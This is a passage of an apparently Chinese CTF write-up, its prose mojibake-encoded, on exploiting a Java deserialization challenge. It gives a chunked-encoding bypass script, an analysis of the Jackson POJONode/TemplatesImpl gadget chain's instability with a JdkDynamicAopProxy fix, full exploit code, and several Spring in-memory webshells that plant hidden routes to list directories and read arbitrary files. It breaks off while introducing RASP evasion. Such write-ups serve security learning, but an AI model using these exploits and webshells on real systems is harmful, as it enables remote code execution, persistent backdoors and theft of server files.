content, ç„¶å /r/n æœ€åä¸€å—ä¸€å®šè¦è¾“å…¥ 0/r/n/r/n ğŸ‘´æµ…æµ…å†™ä¸ªè„šæœ¬ 1234567891011121314import requestsurl = &quot;http://127.0.0.1:8080/read&quot;content = open(&quot;data.txt&quot;,&quot;r&quot;).read()leng = hex(len(content)).replace(&quot;0x&quot;,&quot;&quot;)body = leng+&quot;\\r\\n&quot;+content+&quot;\\r\\n0\\r\\n\\r\\n&quot;print(body)headers= &#123;&quot;transfer-encoding&quot;:&quot;chunked&quot;&#125;res = requests.post(url=url,data=body,headers=headers) soeasy,ğŸ¤£, ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼ŒğŸ‘´ç°åœºç”šè‡³ç¬¬ä¸€æ­¥éƒ½æ²¡è¿‡å». ä¸ç¨³å®š jackson é“¾é—®é¢˜ å…³äº java ååºåˆ—åŒ–ä¸­ jackson é“¾å­ä¸ç¨³å®šé—®é¢˜ (pankas.top) ä» JSON1 é“¾ä¸­å­¦ä¹ å¤„ç† JACKSON é“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) ğŸ‘´ctmd æ‰“ jackson é“¾å­çš„æ—¶å€™ï¼Œæœ‰å²ä»¥æ¥ç¬¬ä¸€æ¬¡é‡è§äº†é™Œç”Ÿçš„æŠ¥é”™ 1com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[&quot;stylesheetDOM&quot;]) ä¸”ç»è¿‡æœ¬åœ°è°ƒè¯•ï¼Œä¼¼ä¹è¿›å…¥äº†é™Œç”Ÿçš„ä»£ç æ®µï¼ŒğŸ‘´å¾ˆä¸ä¹æ„. å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯åœ¨è°ƒç”¨ getters çš„æ—¶å€™ï¼Œä¼˜å…ˆå¥äº† getStylesheetDOM è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œæˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ˜¯ä¸ä¼šå»è®¾ç½®è¿™ä¸ªå€¼çš„ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“çš„ï¼Œnmd ç©ºæŒ‡é’ˆäº†.ğŸ˜“ğŸ˜…è€Œå½“å…¶è°ƒç”¨ getter æ–¹æ³•æ—¶ä¼˜å…ˆè°ƒç”¨ getOutputProperties æ–¹æ³•æ—¶æ‰æ˜¯æˆ‘ä»¬æ­£å¸¸æƒ³è¦çš„ç»“æœã€‚ è¿™ nm çœŸæœ‰å‘å•Šï¼Œæ¯”èµ›æƒ³æ‰“è¿™æ¡é“¾å­ï¼Œä¸è¯´ ban ä½é—®é¢˜ï¼Œnmd è¿™é—®é¢˜ä¹Ÿåªèƒ½é€šè¿‡ä¸åœåœ°é‡ç½®é¶æœºè§£å†³äº†ï¼Œæ¯”èµ›ä½ é‡ç½®é¶æœºï¼Œé™æ€åœ°å€ç­‰ä¼¼å§. ç°åœ¨ğŸ‘´æ¥åˆ†æä¸€ä¸‹æ€ä¹ˆä¸ªäº‹ï¼Œä¼˜åŒ–ä¸€ä¸‹ æµç¨‹ è¿™æ¡é“¾å­åˆ†æğŸ‘´ä¸æƒ³è¯´äº†ï¼Œé—­ç€çœ¼ç›éƒ½çŸ¥é“æ€ä¹ˆä¸ªäº‹. å…³é”®æ˜¯è§¦å‘ POJONode çš„ toString æ–¹æ³•ï¼Œç„¶åå†…éƒ¨ç»è¿‡ä¸€ç³»åˆ—åºåˆ—åŒ–å™¨è°ƒç”¨ POJONode ä¸­å°çš„ _value å±æ€§çš„ getter æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨ TemplatesImpl ç±»å‹å¯¹è±¡çš„ getOutputProperties æ–¹æ³•ä»è€Œå¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚ é‡ç‚¹å°±æ˜¯ä» toString åˆ° getters çš„è°ƒç”¨è¿™ä¸€è¿‡ç¨‹ æ ˆè°ƒè¯•æ”¾åœ¨è¿™: 1234567891011121314151617181920getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) åœ¨ com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField æ–¹æ³•ä¸­åˆ©ç”¨åå°„æ¥æ‰§è¡Œå…¶ getters æ–¹æ³• è¿™æ¬¡å°±è°ƒç”¨äº† getoutputProperties, å¾ˆå¥½ï¼ŒğŸ‘´å–œæ¬¢ğŸ¤ª é‚£å°±å¾€å‰çœ‹çœ‹å“ªé‡Œè·å–äº† getters åœ¨ com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields ä¸­ï¼Œ prop æ•°ç»„å­˜å‚¨äº† getters , é€šè¿‡å¾ªç¯éå†æ‰€æœ‰ getters å¹¶è°ƒç”¨ serializeAsField è¿½è¸ªä¸€ä¸‹è¿™ä¸ªå˜é‡ï¼Œä» _props è·å¾— æœ€ç»ˆåœ¨ com.fasterxml.jackson.databind.introspect èµ‹å€¼ 12345678910111213141516171819202122collectAll:418, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)getJsonValueAccessor:270, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)findJsonValueAccessor:258, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)findSerializerByAnnotations:391, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)_createSerializer2:224, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)createSerializer:173, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)_createUntypedSerializer:1495, SerializerProvider (com.fasterxml.jackson.databind)_createAndCacheUntypedSerializer:1443, SerializerProvider (com.fasterxml.jackson.databind)findValueSerializer:544, SerializerProvider (com.fasterxml.jackson.databind)findTypedValueSerializer:822, SerializerProvider (com.fasterxml.jackson.databind)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡å†³å®š getters é¡ºåº éšåé€šè¿‡ getDeclaredMethods è·å–æ–¹æ³•ï¼Œé‚£è¿™é‡Œè·å–æ–¹æ³•çš„é¡ºåºæ˜¯ä¸å›ºå®šçš„ã€‚ å¹¶ä¸”ï¼Œåœ¨ com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer æ–¹æ³•é‡Œï¼Œä¼šå°†è·å–çš„æ–¹æ³•é¡ºåºè¿›è¡Œç¼“å­˜ï¼Œä¹‹å‰æåˆ°è¿‡äº†ï¼Œç¼“å­˜åä¼šè¿›å…¥å…¶å®ƒ ifã€‚ å› æ­¤ç¬¬ä¸€æ¬¡æ‰“ä¸é€šï¼Œä¹‹åä¹Ÿæ— æ³•æ‰“é€šäº† ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š è·å–é¡ºåºæ˜¯æ ¹æ®åœ°å€çš„å¤§å°æ¥æ’åºçš„ï¼ŒæœŸé—´å­˜åœ¨å†…å­˜ free çš„åŠ¨ä½œï¼Œé‚£åœ°å€æ˜¯ä¸ä¼šä¸€ç›´çº¿æ€§å˜åŒ–çš„ï¼Œä¹‹æ‰€ä»¥ä¸æŒ‰ç…§å­—æ¯æ’åºï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†é€Ÿåº¦è€ƒè™‘ï¼Œæ ¹æ®åœ°å€æ’åºæ˜¯æœ€å¿«çš„ã€‚ æ˜¯åå°„ getDeclaredMethods è·å–åˆ°æ–¹æ³•çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ï¼Œæœ€ç»ˆå¯¼è‡´æ‰§è¡Œç›¸å…³ getter æ–¹æ³•çš„é¡ºåºä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œå½“ TemplatesImpl çš„ getStylesheetDOM æ–¹æ³•å…ˆäº getOutputProperties æ–¹æ³•æ‰§è¡Œæ—¶å°±ä¼šå¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸ä»è€Œå¯¼è‡´è°ƒç”¨é“¾æŠ¥é”™ä¸­æ–­ï¼Œexp åˆ©ç”¨å¤±è´¥ã€‚ è§£å†³æ–¹æ³•ğŸ˜Š org.springframework.aop.framework.JdkDynamicAopProxy è§£å†³é—®é¢˜ å®ç° ä¼—æ‰€å‘¨çŸ¥ï¼Œjava æœ‰ä¸ª b ç©æ„å«åš åŠ¨æ€ä»£ç† ï¼Œå¾ˆ nb,ğŸ‘´åªåœ¨ cc ä¸­ç”¨è¿‡ï¼Œä¸æ¸…æ¥š. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;TestInterface1.class, TestInterface2.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; è¿™æ˜¯æ‰§è¡Œç»“æœï¼Œå¯ä»¥çœ‹æ‡‚èƒ½è·å–åˆ°çš„æ–¹æ³•ï¼Œå®Œå…¨å–å†³äºæ¥å£å®ç°äº†å“ªäº›æ–¹æ³• è€Œ javax.xml.transform.Templates æ¥å£å…¶åªæœ‰ newTransformer å’Œ getOutputProperties è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•ï¼Œè®©ä»–ä½œä¸ºæˆ‘ä»¬ä»£ç†æ‰€éœ€çš„æ¥å£ï¼Œè¿™æ ·æœ€ç»ˆé€šè¿‡ getDeclaredMethods è·å–åˆ°çš„æ–¹æ³•å°±åªæœ‰ newTransformer å’Œ getOutputProperties äº†ï¼Œé‚£ä¹ˆæœ€ç»ˆè·å¾—çš„ getter æ–¹æ³•ä¾¿åªæœ‰ getOutputProperties äº†ã€‚ å› æ­¤åªéœ€è¦æŒ‚ä»£ç†ï¼Œå°±åªä¼šè·å–æ¥å£æ–¹æ³• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import javax.xml.transform.Templates;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; è¿™ä¸¤ä¸ªæ–¹æ³•æ˜¯ Templates é‡Œé¢å®šä¹‰çš„æ¥å£æ–¹æ³• JdkDynamicAopProxy æ˜¯ Spring æ¡†æ¶ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒå®ç°äº† JDK åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œç”¨äºåˆ›å»ºä»£ç†å¯¹è±¡æ¥å®ç°é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„åŠŸèƒ½ã€‚ è¿™é‡Œèƒ½å¤Ÿæ§åˆ¶ advised è¿™é‡Œä¼šè§¦å‘åå°„æ–¹æ³•ï¼Œè¿™é‡Œ advised å‰é¢è¯´è¿‡äº†å¯æ§ æˆ‘ä»¬å°†æ‰€éœ€çš„ TemplatesImpl çš„å¯¹è±¡ç”¨ org.springframework.aop.framework.AdvisedSupport å°è£…å³å¯ 1234Object oldProxy = null; boolean setProxyContext = false; TargetSource targetSource = this.advised.targetSource; Object target = null; æ„é€  12345678Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);cons.setAccessible(true);AdvisedSupport advisedSupport = new AdvisedSupport();advisedSupport.setTarget(templatesImpl);InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);POJONode jsonNodes = new POJONode(proxyObj); ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.fasterxml.jackson.databind.node.BaseJsonNode;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;public class exp &#123; public static void main(String[] args)throws Exception&#123;// ClassPool classPool = ClassPool.getDefault();// CtClass ctClass = classPool.get(evilref.class.getName());// CtClass superClass = classPool.get(AbstractTranslet.class.getName());// ctClass.setSuperclass(superClass);//// CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);//// constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);//// ctClass.addConstructor(constructor); //byte[][] codes = new byte[][]&#123;code&#125;; TemplatesImpl templates = new TemplatesImpl(); ref(templates, &quot;_bytecodes&quot;, new byte[][]&#123;&#125;); ref(templates, &quot;_name&quot;, &quot;shanghe&quot;); ref(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(exp,jsonNodes); serialize_func.serialize(exp); WriteToFileExample(serialize_func.encryptToBase64(&quot;ser.bin&quot;)); &#125; public static void WriteToFileExample(String args) &#123; String content = &quot;è¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²å†…å®¹&quot;; try &#123; BufferedWriter writer = new BufferedWriter(new FileWriter(&quot;output.txt&quot;)); writer.write(args); writer.close(); System.out.println(&quot;å­—ç¬¦ä¸²å·²æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚&quot;); &#125; catch (IOException e) &#123; System.out.println(&quot;å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼š&quot; + e.getMessage()); &#125; &#125; public static void ref(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException &#123; Field reffield = obj.getClass().getDeclaredField(field); reffield.setAccessible(true); reffield.set(obj,value); &#125; public static String serial(Object o) throws IOException, NoSuchFieldException&#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); String base64String = Base64.getEncoder().encodeToString(baos.toByteArray()); return base64String; &#125; public static void deserial(String data) throws Exception &#123; byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125;&#125; å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´ æéº»éº»æ»´ï¼Œå¤ªå¤æ‚äº†ï¼Œè¿˜è¦å†™ä¸ªå†…å­˜é©¬æ‰¾åˆ° RASP, è¿˜å¥½ğŸ‘´æŠ€é«˜ä¸€ç­¹. åˆ—ç›®å½• nm, è·Ÿå–å¤§äº†ä¸€æ ·ï¼Œæ•´è¿™ b ç©æ„ï¼Œè‰¹ğŸ˜¡ é¦–å…ˆæ¥ä¸€ä¸ªé€’å½’åˆ—å‡ºæ‰€æœ‰ç›®å½•æ–‡ä»¶çš„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„ listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file.isFile()) &#123; response.getWriter().write(&quot;File: &quot; + file.getAbsolutePath()); &#125; else if (file.isDirectory()) &#123; response.getWriter().write(&quot;Directory: &quot; + file.getAbsolutePath()); listFilesAndDirectories(file,response); // é€’å½’éå†å­ç›®å½• &#125; &#125; &#125; &#125; &#125; è¿™æ ·çš„ç¼ºç‚¹æ˜¯åˆ—å‡ºæ ¹ç›®å½•çš„æ—¶å€™å¤ªå¤šæ‚ç¢çš„ä¸œè¥¿ï¼ŒğŸ‘´çœ‹ä¸åŠ¨ï¼Œè¦ä¸æ˜¯ğŸ‘´çŸ¥é“ /home ä¸‹é¢æœ‰ä¸œè¥¿ï¼Œè¿™ç©æ„å¤ªéš¾æ‰¾äº†. ä¼˜åŒ–ä¸€ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls1&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls1&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls1(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„ listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file!=null) &#123; response.getWriter().write(file.getAbsolutePath()+&quot;\\r\\n&quot;); &#125; &#125; &#125; &#125; &#125; è¿™æ ·çœ‹èµ·æ¥èˆ’æœå¤šäº†ï¼ŒğŸ‘´å¾ˆä¸­æ„ğŸ˜Š è¯»æ–‡ä»¶ ğŸ‘´æƒ³å°è¯•æŸç’æ¯çš„ä»£ç ï¼Œç›´æ¥é€šè¿‡ ResponseEntity ä¸‹è½½æ–‡ä»¶ï¼Œå¾ˆå¯æƒœï¼Œå¤±è´¥äº†ï¼Œä½†æ˜¯æ¶‰åŠåˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„è¯»å–ï¼Œæ€ä¹ˆåŠï¼ŒğŸ‘´ç”¨ base64 è¯»å‡ºæ¥ï¼ŒğŸ‘´çœŸ tm æ˜¯å®Œç¾å¤©æ‰çš„ idol (bushi) ç»ˆäºğŸ‘´æƒ³æ˜ç™½äº†ä¸€ä»¶äº‹ï¼Œå†™å‡ºäº†å†…å­˜ğŸ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exre extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exre.class.getMethod(&quot;readfile2&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/readfile2&quot;).options(config).build(); exre readfile_inject = new exre(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void readfile2(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String filePath = request.getParameter(&quot;filepath&quot;); if(filePath!=null)&#123; FileInputStream fileInputStream = new FileInputStream(filePath); byte[] fileBytes = new byte[fileInputStream.available()]; fileInputStream.read(fileBytes); fileInputStream.close(); String base64String = Base64.getEncoder().encodeToString(fileBytes); response.getWriter().write(base64String); response.getWriter().flush(); &#125; &#125;&#125; ä»€ä¹ˆï¼Œä½ è¯´ä½ ä¸ä¼š base64 è½¬æˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŸğŸ¤£ è‡ªå·±å†™ä¸ªè„šæœ¬è½¬æ¢éƒ½è¡Œï¼ŒğŸ‘´å‘Šè¯‰ä½ ï¼Œè¿˜èƒ½ä¸Š cyberchef è½¬æ¢ï¼Œè¿˜èƒ½å¯¼å‡ºä¸ºæ–‡ä»¶ğŸ˜… RASPğŸ˜…ğŸ˜¡ ç»•è¿‡ content-length å°±ç®€å•äº†ï¼Ÿ8 å¯èƒ½ï¼ nmb ç”šè‡³æœ‰ RASP,âˆšâ…§,ğŸ‘´æ²¡å­¦è¿‡. å•¥äº‹ RASP åœ¨ 2012 å¹´çš„æ—¶å€™ï¼ŒGartner å¼•å…¥äº† Runtime application self-protection ä¸€è¯ï¼Œç®€ç§°ä¸º RASPã€‚å®ƒæ˜¯ä¸€ç§æ–°å‹åº”ç”¨å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒå°†ä¿æŠ¤ç¨‹åºåƒç–«è‹—ä¸€æ 